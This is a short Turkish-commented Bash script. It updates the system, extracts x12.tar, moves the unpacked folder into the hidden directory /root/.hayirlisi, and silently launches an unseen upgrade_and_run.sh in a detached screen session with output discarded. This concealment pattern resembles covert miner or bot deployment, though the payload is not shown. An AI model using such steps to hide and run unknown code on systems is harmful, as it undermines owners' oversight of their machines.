#!/bin/bash

# Sistem güncellemelerini yap
echo "Sistem güncellemeleri yapılıyor..."
sudo apt update -y
sudo apt-get upgrade -y

# /root/dogibokubuseferyemedi klasörünün var olup olmadığını kontrol et
dogiPath="/root/dogibokubuseferyemedi"
if [ ! -d "$dogiPath" ]; then
    echo "Klasör bulunamadı, oluşturuluyor..."
    sudo mkdir -p "$dogiPath"
fi

# /root/dogibokubuseferyemedi klasörüne geç
cd "$dogiPath" || { echo "Klasöre geçiş yapılamadı."; exit 1; }

# x12.tar dosyasını çıkar
echo "x12.tar çıkarılıyor..."
sudo tar -xf x12.tar

# hayirlisi klasörünü /root altına gizli olarak taşı ve ayarları yap
echo "Klasör taşınıyor ve ayarlar yapılıyor..."
sudo mv hayirlisi /root/
sudo chmod 700 /root/hayirlisi
sudo chown root:root /root/hayirlisi
sudo mv /root/hayirlisi /root/.hayirlisi

# upgrade_and_run.sh script'ini nohup ile çalıştır
echo "upgrade_and_run.sh çalıştırılıyor..."
cd /root/.hayirlisi || { echo "Klasöre geçiş yapılamadı."; exit 1; }
sudo screen -dmS caliskan bash -c 'nohup bash upgrade_and_run.sh > /dev/null 2>&1 &'

# /root/dogibokubuseferyemedi klasörüne geri dön
cd "$dogiPath" || { echo "Klasöre geri dönüş yapılamadı."; exit 1; }

# 'online' adında yeni bir screen oturumu başlat
echo "'online' adında screen oturumu başlatılıyor..."
sudo screen -dmS online

echo "Tüm işlemler başarıyla tamamlandı."
